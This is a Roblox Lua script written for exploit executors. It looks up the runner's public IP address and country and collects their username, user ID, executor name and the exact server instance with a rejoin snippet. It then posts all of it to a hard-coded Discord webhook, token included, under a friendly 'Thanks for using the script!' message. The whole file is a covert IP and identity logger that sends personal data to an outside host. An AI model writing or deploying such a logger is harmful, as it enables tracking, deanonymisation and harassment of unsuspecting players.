-- Roblox Lua (to be run inside an exploit executor that supports HTTP)
local HttpService  = game:GetService("HttpService")
local WebhookUrl   = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"

-- Try to detect executor; if identifyexecutor() doesn't exist or returns nil, fall back to "UnknownExecutor"
local executorName = "UnknownExecutor"
if pcall(function() return identifyexecutor() end) then
    local detected = identifyexecutor()
    if type(detected) == "string" and #detected > 0 then
        executorName = detected
    end
end

-- Fetch IP info (country + ip) from https://api.myip.com/; if anything fails, return "Unknown"
local function getIPInfo()
    local ok, response = pcall(function()
        return HttpService:GetAsync("https://api.myip.com/")
    end)

    if not ok or typeof(response) ~= "string" then
        return "Unknown", "Unknown"
    end

    local success, data = pcall(function()
        return HttpService:JSONDecode(response)
    end)
    if not success or type(data) ~= "table" or not data.country or not data.ip then
        return "Unknown", "Unknown"
    end

    return data.country, data.ip
end

-- Build the actual Discord‐webhook payload
local function buildWebhookPayload()
    -- Local player info
    local player      = game.Players.LocalPlayer
    local displayName = (player and player.DisplayName) or "Not Available"
    local userName    = (player and player.Name)        or "UnknownUser"
    local playerId    = (player and player.UserId)      or 0

    -- PlaceId and JobId (to re-join the exact same server instance)
    local placeId = tostring(game.PlaceId or 0)
    local jobId   = tostring(game.JobId or "")

    -- Construct the Roblox teleport snippet; note that jobId is wrapped in single quotes
    local joinScript = 
        "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
        placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"

    -- Fetch country + IP (returns “Unknown” if it fails)
    local country, ipAddr = getIPInfo()

    -- Build an “embed” that shows executor, country, IP, etc.
    local embeds = {
        {
            author = {
                name = "Zte Hub Server",
            },
            title  = userName .. " | " .. displayName,
            type   = "rich",
            color  = tonumber(0x00FF00),

            thumbnail = {
                url = 
                  "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?"
                  .. "userid=" .. playerId .. "&size=720x720&format=Png&isCircular=false"
            },

            fields = {
                {
                    name  = "Executor:",
                    value = tostring(executorName),
                    inline = false,
                },
                {
                    name  = "Country:",
                    value = tostring(country),
                    inline = false,
                },
                {
                    name  = "IP Address:",
                    value = tostring(ipAddr),
                    inline = false,
                },
                {
                    name  = "Game Name:",
                    value = tostring(game.Name or "Unknown Game"),
                    inline = false,
                },
            },
        },
        {
            title       = "Join Server Script",
            description = "```lua\n" .. joinScript .. "\n```",
            color       = tonumber(0x00FF00),
        }
    }

    local payload = {
        content = "**Thanks for using the script!**",
        embeds  = embeds,
    }

    return {
        Url     = WebhookUrl,
        Method  = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body    = HttpService:JSONEncode(payload),
    }
end

-- Send the HTTP request to Discord
local function sendWebhook()
    local requestData = buildWebhookPayload()

    -- If running under Synapse X (syn.request()), use that:
    if syn and typeof(syn.request) == "function" then
        syn.request(requestData)
        return
    end

    -- Otherwise try one of the common fallback names:
    local fallbackRequester = http_request or request or http.request or HttpPost
    if typeof(fallbackRequester) == "function" then
        fallbackRequester(requestData)
        return
    end

    warn("No supported HTTP‐request function found! Cannot send webhook.")
end

-- Execute
sendWebhook()
